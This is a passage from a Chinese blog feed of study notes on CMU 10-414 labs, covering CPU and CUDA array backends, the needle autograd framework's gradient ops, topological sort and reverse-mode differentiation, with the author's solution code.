class="hljs-built_in">compact</span>()._handle,<br>           other.<span class="hljs-built_in">compact</span>()._handle, out._handle)<br></code></pre></td></tr></table></figure><p>而这个函数也对应到了这样的c语言参数列表</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">EwiseDiv</span><span class="hljs-params">(<span class="hljs-type">const</span> AlignedArray &amp;a, <span class="hljs-type">const</span> AlignedArray &amp;b, AlignedArray *out)</span></span><br></code></pre></td></tr></table></figure><p>现在还不太清楚的是为什么传入的都是handle，怎么out的就是指针，其他的就是引用</p><h1 id="Part-4-CPU-Backend-Reductions"><a href="#Part-4-CPU-Backend-Reductions" class="headerlink" title="Part 4: CPU Backend - Reductions"></a>Part 4: CPU Backend - Reductions</h1><p>这里要完成对特定维度的sum或者max函数</p><p>在numpy中，可以通过直接axes实现，但是在c数组中，就有点麻烦了</p><p>lab先在Python文件中对这个操作进行了预处理</p><ol><li>首先，只允许指定一个轴</li><li>通过改变shape和stride，将我们需要操作的一个reduce块变成连续的<ol><li>首先，将要操作的那个维度放到shape的最后，可以通过<code>permute</code>来完成维度的移动。</li><li>构造出reduce操作之后out的形状，就是将操作的那个轴的长度变成1</li></ol></li></ol><p>因此，在c文件中，只需要将a数组分段求和或者求最大值，然后依次存入out数组就行了</p><h1 id="Part-5-CPU-Backend-Matrix-multiplication"><a href="#Part-5-CPU-Backend-Matrix-multiplication" class="headerlink" title="Part 5: CPU Backend - Matrix multiplication"></a>Part 5: CPU Backend - Matrix multiplication</h1><p>第一部分的<code>Matmul</code>就是常规的二维矩阵乘法，记得要在累加之前先清零</p><p>第二部分的<code>MatmulTiled</code>是以<code>Tile</code>为变成的正方形进行操作</p><ol><li><p>首先需要完成<code>AlignedDot</code>，这个函数是对两个正方形矩形做乘法</p> <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; TILE; i++) <br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">0</span>; j &lt; TILE; j++) <br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> k = <span class="hljs-number">0</span>; k &lt; TILE; k++) <br>            out[i * TILE + j] += a[i * TILE + k] * b[k * TILE + j];<br></code></pre></td></tr></table></figure><p> 需要注意的是，这里面的out后续还会加上其他的正方形相乘之后，因此不能在操作前清零</p></li><li><p>在上面这个函数的帮助下，求出两个四维矩阵相乘的结果</p><p> 只需要遍历out每一个<code>Tile×Tile</code>的正方形，它是由很多个a和b的正方形相乘得到。在<code>AlignedDot</code>的抽象下可以将正方形看成一个普通的整数</p><p> <code>MatmulTiled</code>需要在开始操作之前对out初始化为0</p></li></ol><p>之所以要用Tile这种乘法，好像是为了利用cpu的向量化的操作，这一块目前还没啥了解</p><ol><li><code>__restrict__</code>表示这一块区域只有当前指针可以访问到，因此不会和别人有重复的区域。这个应该是可以增加cpu的并行性能</li><li><code>__builtin_assume_aligned</code>表示这个指针在内存中已经对齐了。这个应该是增加内存访问的性能</li></ol><h1 id="Part-6-CUDA-Backend-Compact-and-setitem"><a href="#Part-6-CUDA-Backend-Compact-and-setitem" class="headerlink" title="Part 6: CUDA Backend - Compact and setitem"></a>Part 6: CUDA Backend - Compact and setitem</h1><p>要完成的效果和cpu的基本一样，但是因为cuda的特点，我们不需要手动模拟n重for循环，直接用线程块的id来表示当前处于for循环的哪个位置</p><p>因此，通过gid和shape，就可以得出来loop数组，然后再在便宜的基础上加上loop数组和stride数组的点积，就可以得到非compact数组的坐标。这里要注意，对于紧凑的数组，stride可以通过shape计算出来，但是对于非紧凑的数组，stride和shape没有必然的关系，因此在这里计算loop数组的时候，需要手动倒序遍历shape数组</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__device__ <span class="hljs-type">size_t</span> <span class="hljs-title">GetIndex</span><span class="hljs-params">(<span class="hljs-type">size_t</span> cnt, CudaVec shape, CudaVec strides, <span class="hljs-type">size_t</span> offset)</span> </span>&#123;<br>    <span class="hljs-type">int</span> pre_len = <span class="hljs-number">1</span>, cur_len;<br>    <span class="hljs-type">size_t</span> loop[MAX_VEC_SIZE];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = shape.size - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        cur_len = pre_len * shape.data[i];<br>        loop[i] = (cnt % cur_len) / pre_len;<br>        pre_len = cur_len;<br>    &#125;<br>    <span class="hljs-type">size_t</span> idx = offset;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; strides.size; i++) &#123;<br>        idx += loop[i] * strides.data[i];<br>    &#125;<br>    <span class="hljs-keyword">return</span> idx;<br>&#125;<br><br><span class="hljs-function">__global__ <span class="hljs-type">void</span> <span class="hljs-title">CompactKernel</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">scalar_t</span> *a, <span class="hljs-type">scalar_t</span> *out, <span class="hljs-type">size_t</span> size, CudaVec shape,</span></span><br><span class="hljs-params"><span class="hljs-function">                              CudaVec strides, <span class="hljs-type">size_t</span> offset, Modes mode, <span class="hljs-type">int</span> val = <span class="hljs-number">-1</span>)</span> </span>&#123;<br>    <span class="hljs-type">size_t</span> gid = blockIdx.x * blockDim.x + threadIdx.x;<br>    <span class="hljs-keyword">if</span> (gid &lt; size) &#123;<br>        <span class="hljs-type">int</span> idx = <span class="hljs-built_in">GetIndex</span>(gid, shape, strides, offset);<br>        <span class="hljs-keyword">switch</span> (mode) &#123;<br>        <span class="hljs-keyword">case</span> mode_in:<br>            out[gid] = a[idx];<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> mode_out:<br>            out[idx] = a[gid];<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> mode_set:<br>            out[idx] = val;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这两个函数就是最重要的，要实现的三个函数调用这个函数即可。要注意传入的size，这个size应该是紧凑的数组的长度，因此在Compact函数中要传入out.size，而在EwiseSetitem中，应该传入a.size。而传给CudaDims的size同理，也是这样的。</p><h1 id="Part-7-CUDA-Backend-Elementwise-and-scalar-operations"><a href="#Part-7-CUDA-Backend-Elementwise-and-scalar-operations" class="headerlink" title="Part 7: CUDA Backend - Elementwise and scalar operations"></a>Part 7: CUDA Backend - Elementwise and scalar <strong>operations</strong></h1><p>复制粘贴， 替换符号</p><p>感觉正确的做法应该是重载操作符，但是我不会</p><h1 id="Part-8-CUDA-Backend-Reductions"><a href="#Part-8-CUDA-Backend-Reductions" class="headerlink" title="Part 8: CUDA Backend - Reductions"></a>Part 8: CUDA Backend - Reductions</h1><p>意思和cpu的一样，很简单了</p><h1 id="Part-9-CUDA-Backend-Matrix-multiplication"><a href="#Part-9-CUDA-Backend-Matrix-multiplication" class="headerlink" title="Part 9: CUDA Backend - Matrix multiplication"></a>Part 9: CUDA Backend - Matrix multiplication</h1><p>这里需要实现cuda上的矩阵乘法，不优化的还是挺好写的</p><p>首先要自己构造grid和block，为了防止M和P过大，这里选择让grid的长和宽为<code>BASE_THREAD_NUM</code>，block的长和宽为M和P除以这个值的上取整</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">dim3 <span class="hljs-title">grid</span><span class="hljs-params">(BASE_THREAD_NUM, BASE_THREAD_NUM)</span></span>;<br><span class="hljs-function">dim3 <span class="hljs-title">block</span><span class="hljs-params">(Ceil(M), Ceil(P))</span></span>;<br></code></pre></td></tr></table></figure><p>在核函数中，用当前线程的x和y坐标代表out的坐标，然后用一个for循环就可以完成点积和累加了</p>]]></content>
    
    
    <categories>
      
      <category>深度学习框架</category>
      
      <category>CMU10414</category>
      
    </categories>
    
    
    <tags>
      
      <tag>深度学习框架</tag>
      
      <tag>CMU10414</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>cmu10414_lab3</title>
    <link href="/2023/11/08/cmu10414-lab3/"/>
    <url>/2023/11/08/cmu10414-lab3/</url>
    
    <content type="html"><![CDATA[<h1 id="Introduction-to-needle"><a href="#Introduction-to-needle" class="headerlink" title="Introduction to needle"></a>Introduction to <code>needle</code></h1><p>两个重要的问题</p><ol><li><code>python/needle/autograd.py</code>，定义了框架，包括但不限于以下部分<ol><li>class Op</li><li>class TensorOp(Op)</li><li>class Value</li><li>class Tensor(Value)</li><li>compute_gradient_of_variables</li></ol></li><li><code>python/needle/ops/ops_mathematic.py</code>，包含多种操作的实现</li></ol><p>推荐先熟悉以下类，其他的没那么重要</p><ol><li><p>Value</p></li><li><p>Op</p><p> 关键在于两个函数</p><p> compute()会计算输出</p><p> gradient()会根据输出的梯度，求出输入的梯度（反向传播）</p></li><li><p>Tensor</p></li><li><p>TensorOp</p></li></ol><h1 id="实现forward操作"><a href="#实现forward操作" class="headerlink" title="实现forward操作"></a>实现forward操作</h1><p>很多操作就是一行numpy函数解决，但是最后一个需要自己再处理一下逻辑</p><p>在numpy中，转置维度必须将所有维度包括了，加入维度是5，那么输入的axes的长度一定是五，然后把要交换的两个维度交换位置，比如这里就是将2和4对应的维度交换，[0,1,4,3,2]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">compute</span><span class="hljs-params">(self, a)</span>:</span><br><span class="hljs-function">    d =</span> a.ndim<br>    axis = [i <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(d)]<br>    x, y = (d - <span class="hljs-number">1</span>, d - <span class="hljs-number">2</span>) <span class="hljs-keyword">if</span> self.axes is None        <span class="hljs-built_in">else</span>(self.axes[<span class="hljs-number">0</span>], self.axes[<span class="hljs-number">1</span>])<br>    axis[x], axis[y] = axis[y], axis[x]<br>    <span class="hljs-keyword">return</span> array_api.<span class="hljs-built_in">transpose</span>(a, axes=axis)<br></code></pre></td></tr></table></figure><h1 id="实现backward计算"><a href="#实现backward计算" class="headerlink" title="实现backward计算"></a>实现backward计算</h1><h2 id="power-scalar"><a href="#power-scalar" class="headerlink" title="power_scalar"></a>power_scalar</h2><p>$$<br>y&#x3D;x^a\<br>\frac{dy}{dx}&#x3D;ax^{a-1}<br>$$</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    return out_grad * self.scalar * mul_scalar(node.inputs[<span class="hljs-number">0</span>], self.scalar - <span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><h2 id="divide"><a href="#divide" class="headerlink" title="divide"></a>divide</h2><p>$$<br>y&#x3D;\frac{a}{b}\<br>\frac{dy}{da}&#x3D;\frac{1}{b}\<br>\frac{dy}{db}&#x3D;-\frac{a}{b^2}<br>$$</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    a_d =</span> <span class="hljs-built_in">divide</span>(out_grad, node.inputs[<span class="hljs-number">1</span>])<br>    b_d = <span class="hljs-built_in">negate</span>(<span class="hljs-built_in">multiply</span>(out_grad, <span class="hljs-built_in">divide</span>(<br>        node.inputs[<span class="hljs-number">0</span>], <span class="hljs-built_in">multiply</span>(node.inputs[<span class="hljs-number">1</span>], node.inputs[<span class="hljs-number">1</span>]))))<br>    <span class="hljs-keyword">return</span> a_d, b_d<br>    # END YOUR SOLUTION<br></code></pre></td></tr></table></figure><h2 id="divide-scalar"><a href="#divide-scalar" class="headerlink" title="divide_scalar"></a>divide_scalar</h2><p>标量操作很简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    return out_grad / self.scalar</span><br></code></pre></td></tr></table></figure><h2 id="matmul"><a href="#matmul" class="headerlink" title="matmul"></a>matmul</h2><p>这个操作就有点恶心了，特别是两个相乘的矩阵存在高纬（超过两维的情况）</p><p>高维矩阵相乘，本质上是多个二维矩阵相乘，它们除了最后两个维度要能够相乘外，前面的维度必须完全相同，比如一个四维矩阵A[a,b,c,d]和一个三维矩阵[e,f,g]可以相乘的条件就是[c,d]和[f,g]要能够相乘，并且b要等于e</p><p>而求导，也就是将前面维度全部求和，比如C&#x3D;AB，其中A的维度是[a,b,c,d]，B的维度是[d,e]，C的维度就是[a,b,c,e]</p><ol><li>现在损失对A求导的结果的形状肯定也是[a,b,c,d]，这个维度很容易通过C的梯度的形状[a,b,c,e]和B的形状[d,e]凑出来</li><li>而损失函数对B求导的形状肯定是[d,e]，但是这个不能直接由C的梯度[a,b,c,e]和A的梯度[a,b,c,d]凑出来，因为多了前面两维[a,b]，将这两维给除去的方法，就是将对应位置给加起来，通过numpy.sum(0,1)就可以达到这个效果。（为什么相加之后结果就是B的导数，就和矩阵求导相关了，我也不会证明）</li></ol><p>最后，对一个高维矩阵，比如[a,b,c,d]进行转置，好像只会将它转为[a,b,d,c]</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    lhs, rhs =</span> node.inputs<br>    lgrad, rgrad = <span class="hljs-built_in">matmul</span>(out_grad, rhs.<span class="hljs-built_in">transpose</span>()), <span class="hljs-built_in">matmul</span>(<br>        lhs.<span class="hljs-built_in">transpose</span>(), out_grad)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(lhs.shape) &lt; <span class="hljs-built_in">len</span>(lgrad.shape):<br>        lgrad = lgrad.<span class="hljs-built_in">sum</span>(<br>            <span class="hljs-built_in">tuple</span>([i <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(lgrad.shape) - <span class="hljs-built_in">len</span>(lhs.shape))]))<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(rhs.shape) &lt; <span class="hljs-built_in">len</span>(rgrad.shape):<br>        rgrad = rgrad.<span class="hljs-built_in">sum</span>(<br>            <span class="hljs-built_in">tuple</span>([i <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(rgrad.shape) - <span class="hljs-built_in">len</span>(rhs.shape))]))<br>    <span class="hljs-keyword">return</span> lgrad, rgrad<br></code></pre></td></tr></table></figure><h2 id="reshape"><a href="#reshape" class="headerlink" title="reshape"></a>reshape</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    return reshape(out_grad, node.inputs[<span class="hljs-number">0</span>].shape)</span><br><span class="hljs-function">    # END YOUR SOLUTION</span><br></code></pre></td></tr></table></figure><h2 id="negate"><a href="#negate" class="headerlink" title="negate"></a>negate</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    return negate(out_grad)</span><br></code></pre></td></tr></table></figure><h2 id="transpose"><a href="#transpose" class="headerlink" title="transpose"></a>transpose</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    return transpose(out_grad, self.t)</span><br></code></pre></td></tr></table></figure><h2 id="broadcast"><a href="#broadcast" class="headerlink" title="broadcast"></a>broadcast</h2><ol><li>将变化的维度给找出来，比如原始数据是[3,5,1,4]，被广播成了[3,5,4,4]，那么要做的就是将第3维给找出来，也就是1-&gt;4的这一维，然后将这一维的梯度通过sum相加</li><li>最后还要reshape成原来的样子</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    ori_shape =</span> node.inputs[<span class="hljs-number">0</span>].shape<br>    shrink_dims = [i <span class="hljs-keyword">for</span> i in <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(self.shape))]<br>    <span class="hljs-keyword">for</span> i, (ori, cur) in <span class="hljs-built_in">enumerate</span>(<span class="hljs-built_in">zip</span>(<span class="hljs-built_in">reversed</span>(ori_shape), <span class="hljs-built_in">reversed</span>(self.shape))):<br>        <span class="hljs-keyword">if</span> ori == cur:<br>            shrink_dims[<span class="hljs-built_in">len</span>(self.shape) - i - <span class="hljs-number">1</span>] = <span class="hljs-number">-1</span><br>    shrink_dims = <span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">filter</span>(lambda x: x &gt;= <span class="hljs-number">0</span>, shrink_dims))<br>    <span class="hljs-keyword">return</span> out_grad.<span class="hljs-built_in">sum</span>(shrink_dims).<span class="hljs-built_in">reshape</span>(ori_shape)<br>    # END YOUR SOLUTION<br></code></pre></td></tr></table></figure><h2 id="summation"><a href="#summation" class="headerlink" title="summation"></a>summation</h2><p>summation是对维度进行了压缩，那么在反向传播时，肯定要将其进行广播</p><p>所以</p><ol><li>先找出哪些维度被压缩了</li><li>reshape成被压缩的形状（之前通过sum操作，可能直接将维度给干没了，所以要reshape恢复维度，即使那个维度的长度是1）</li><li>广播成输入的形状（为啥可以直接广播就是正确的梯度，和矩阵求导相关）</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">gradient</span><span class="hljs-params">(self, out_grad, node)</span>:</span><br><span class="hljs-function">    # BEGIN YOUR SOLUTION</span><br><span class="hljs-function">    new_shape =</span> <span class="hljs-built_in">list</span>(node.inputs[<span class="hljs-number">0</span>].shape)<br>    axes = <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(new_shape)) <span class="hljs-keyword">if</span> self.axes is None <span class="hljs-keyword">else</span> self.axes<br>    <span class="hljs-keyword">for</span> axis in axes:<br>        new_shape[axis] = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> out_grad.<span class="hljs-built_in">reshape</span>(new_shape).<span class="hljs-built_in">broadcast_to</span>(node.inputs[<span class="hljs-number">0</span>].shape)<br></code></pre></td></tr></table></figure><h1 id="拓扑排序"><a href="#拓扑排序" class="headerlink" title="拓扑排序"></a>拓扑排序</h1><p>这个部分感觉题意有点难理解，本质上很简单</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">find_topo_sort</span><span class="hljs-params">(node_list: List[Value])</span> -&gt; List[Value]:</span><br></code></pre></td></tr></table></figure><p>这个函数给出了一个node_list，这里面可能有多个node，输出以这个node为终点的拓扑排序（正拓扑排序）</p><blockquote><p>以目前我的理解，不太明白为什么是node_list，一般不就是用最后lost的函数的结点为终点找拓扑排序吗。</p><p>我看了一下测试的代码，也都是只用了一个节点，先留个坑</p></blockquote><p>下面这个函数给了一个dfs的模板</p><ol><li>第一个参数node代表当前遍历到了哪个结点</li><li>第二个参数visited代表已经有哪些结点被访问过了</li><li>第三个参数topo_order代表目前已经找到的拓扑排序，我们最后也就是要返回这个作为拓扑排序的答案</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">topo_sort_dfs</span><span class="hljs-params">(node, visited, topo_order)</span>:</span><br></code></pre></td></tr></table></figure><p>实现代码很简单，就是题意对我来说有一点晦涩，感觉和不太熟悉怎么用终点推出拓扑排序有关，菜狗</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">find_topo_sort</span><span class="hljs-params">(node_list: List[Value])</span> -&gt; List[Value]:</span><br><span class="hljs-function">    ans =</span> []<br>    vis = <span class="hljs-built_in">set</span>()<br>    <span class="hljs-keyword">for</span> node in node_list:<br>        <span class="hljs-built_in">topo_sort_dfs</span>(node, vis, ans)<br>    <span class="hljs-keyword">return</span> ans<br>def <span class="hljs-built_in">topo_sort_dfs</span>(node, visited, topo_order):<br>    <span class="hljs-keyword">if</span> node in visited:<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">for</span> ne in node.inputs:<br>        <span class="hljs-built_in">topo_sort_dfs</span>(ne, visited, topo_order)<br>    visited.<span class="hljs-built_in">add</span>(node)<br>    topo_order.<span class="hljs-built_in">append</span>(node)<br></code></pre></td></tr></table></figure><h1 id="反向模式微分"><a href="#反向模式微分" class="headerlink" title="反向模式微分"></a>反向模式微分</h1><p>函数签名</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">compute_gradient_of_variables</span><span class="hljs-params">(output_tensor, out_grad)</span></span><br></code></pre></td></tr></table></figure><ol><li>第一个参数是最后输出的那个tensor</li><li>第二个参数是这个tensor的梯度</li></ol><p>函数内已有的变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">node_to_output_grads_list: Dict[Tensor, List[Tensor]] = &#123;&#125;<br></code></pre></td></tr></table></figure><p>这个字典表示，当前tensor对应的，所有输出tensor对它的偏导数</p><p>使用起来也很简单，只要将对应的偏导数全部相加，就是当前tensor的梯度</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">reverse_topo_order = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">find_topo_sort</span>([output_tensor])))<br></code></pre></td></tr></table></figure><p>这就是反向的拓扑排序</p><p>实现思路基本就是下面这个图</p><p><img src="http://woaixiaoxiao-image.oss-cn-beijing.aliyuncs.com/img/image-20231024161041846.png" alt="image-20231024161041846"></p><p>但是需要加入一些对当前框架的理解</p><ol><li>首先，这个函数的作用就是计算出每一个tensor对应的梯度，而通过上图也可以看到，我们在反向传播中是通过新建了一个tensor来保存梯度的。按照这个框架的意思，好像是将这个新建的tensor作为原来tensor的一个变量存入原来的tensor，这里可以用self.grad来存。感觉这个参数可以随便命名，可能后面的调用都是自己写</li><li>这里要用到之前写的各种op中的gradient函数了，可以通过<code>gradient_as_tuple</code>来调用。这个函数也正是生成了对输入的所有tensor对应的偏导数tensor，核心操作了属于是</li></ol><p>因此，实现思路</p><ol><li>按照反向拓扑排序的顺序来遍历所有tensor</li><li>根据<code>node_to_output_grads_list</code>对应的值，计算这个tensor的梯度，这里可以用框架提供的<code>sum_node_list</code>来计算梯度之和。然后将计算好的梯度存入当前node</li><li>如果当前tensor没有input结点，也就是op为None，直接continue</li><li>如果当前tensor有input结点<ol><li>先通过<code>gradient_as_tuple</code>取出这个tensor对所有input的偏导数tensor</li><li>然后将input和偏导数tensor一一对应的访问，加入字典<code>node_to_output_grads_list</code>中</li></ol></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">def <span class="hljs-title">compute_gradient_of_variables</span><span class="hljs-params">(output_tensor, out_grad)</span>:</span><br><span class="hljs-function">    node_to_output_grads_list: Dict[Tensor, List[Tensor]] =</span> &#123;&#125;<br>    node_to_output_grads_list[output_tensor] = [out_grad]<br>    reverse_topo_order = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">reversed</span>(<span class="hljs-built_in">find_topo_sort</span>([output_tensor])))<br>    <span class="hljs-keyword">for</span> node in reverse_topo_order:<br>        grads = <span class="hljs-built_in">sum_node_list</span>(node_to_output_grads_list[node])<br>        node.grad = grads<br>        <span class="hljs-keyword">if</span> node.op is None:<br>            <span class="hljs-keyword">continue</span><br>        node_to_input_grad = node.op.<span class="hljs-built_in">gradient_as_tuple</span>(node.grad, node)<br>        <span class="hljs-keyword">for</span> input_node, input_grad in <span class="hljs-built_in">zip</span>(node.inputs, node_to_input_grad):<br>            <span class="hljs-keyword">if</span> input_node <span class="hljs-keyword">not</span> in node_to_output_grads_list:<br>                node_to_output_grads_list[input_node] = []<br> node_to_output_grads_list[input_node].<span class="hljs-built_in">append</span>(input_grad)<br></code></pre></td></tr></table></figure><h1 id="softmax-loss"><a href="#softmax-loss" class="headerlink" title="softmax loss"></a>softmax loss</h1><p>先实现两个op，要注意，在反向传播的过程中，要全程调用tensor的op，不能再用numpy的操作了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">class</span> <span class="hljs-title">Log</span><span class="hljs-params">(TensorOp)</span>:</span><br><span class="hljs-function">    def compute(self, a):</span><br><span class="hljs-function">        return array_api.log(a)</span><br><span class="hljs-function">    def gradient(self, out_grad, node):</span><br><span class="hljs-function">        return divide(out_grad, node.inputs[<span class="hljs-number">0</span>])</span><br><span class="hljs-function">class Exp(TensorOp):</span><br><span class="hljs-function">    def compute(self, a):</span><br><span class="hljs-function">        return array_api.exp(a)</span><br><span class="hljs-function">    def gradient(self, out_grad, node):</span><br><span class="hljs-function">        return multiply(out_grad, exp(node.inputs[<span class="hljs-number">0</span>]))</span><br></code></pre></td></tr></table></figure><p>实现softmax，基本就是翻译hw0里的softmax_loss函数，这里用了比较巧的计算方法， 